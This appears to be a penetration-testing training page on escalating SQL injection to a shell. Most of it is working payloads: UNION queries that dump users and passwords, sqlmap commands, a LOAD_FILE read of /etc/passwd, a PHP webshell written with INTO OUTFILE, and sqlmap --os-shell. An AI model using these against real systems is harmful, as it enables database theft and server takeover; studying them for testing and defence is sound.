---
title: SQL injection to a shell
slug: sqli-to-shell
area: web
module: 17
order: 3
goal: Find a SQL injection, dump the database, and where possible escalate it to file read/write or command execution.
summary: How to exploit SQLi end to end — confirm it, enumerate with UNION/error/blind, automate with sqlmap, then read files or get RCE where the DBMS allows.
prereqs: [A parameter you suspect is injectable, Knowing (or fingerprinting) the DBMS, A proxy to craft requests]
seeAlso: [tool:sqlmap, tool:sql-injection, tool:web-proxies, howto:file-upload-to-shell, map:start]
references:
  - PayloadsAllTheThings: SQL injection | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
  - HackTricks: SQL injection | https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html
---

SQL injection runs your SQL on the back-end database. First confirm it and learn the DBMS, then dump data — and, if the DBMS and privileges allow, read/write files or run commands.

## Confirm it

```sql
'           -- breaks the query (error = injectable)
1' AND '1'='1      -- true
1' AND '1'='2      -- false  (different response = boolean-blind)
1' ORDER BY 5-- -  -- column count (error when too high)
```

## UNION-based dump

```sql
' UNION SELECT 1,2,3-- -                                  # find the reflected column
' UNION SELECT 1,@@version,database()-- -                 # fingerprint + current DB
' UNION SELECT 1,table_name,3 FROM information_schema.tables-- -
' UNION SELECT 1,username,password FROM users-- -
```

## Let sqlmap do the work

```bash
sqlmap -u 'http://TARGET/page.php?id=1' --batch --dbs
sqlmap -u 'http://TARGET/page.php?id=1' -D appdb --dump
sqlmap -r request.txt --batch --level 5 --risk 3           # from a saved Burp request
```

## Escalate: files and RCE

Where privileges allow (e.g. MySQL `FILE`, MSSQL `xp_cmdshell`, Postgres `COPY`):

```sql
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -                         # MySQL file read
' UNION SELECT 1,'<?php system($_GET[c]);?>',3 INTO OUTFILE '/var/www/html/s.php'-- -
```

```bash
sqlmap -u '...' --os-shell          # MSSQL xp_cmdshell / stacked queries
sqlmap -u '...' --file-read=/etc/passwd
```

## If it fails

- **No error and no visible change**: it may be blind — use boolean or time-based (`' AND SLEEP(5)-- -`), or let sqlmap find the technique.
- **UNION column count wrong**: match the number and the data types; use `NULL`s until no error, then substitute.
- **WAF blocks payloads**: try sqlmap `--tamper` scripts, or encode/case-vary manually.
- **OUTFILE denied**: no FILE privilege or `secure_file_priv` is set — fall back to dumping creds and reusing them instead.

## Verify

Dumped credentials, a file you shouldn't read, or a webshell responding to commands all confirm it. If you wrote a shell, see File upload to a shell for turning it into a reverse shell.
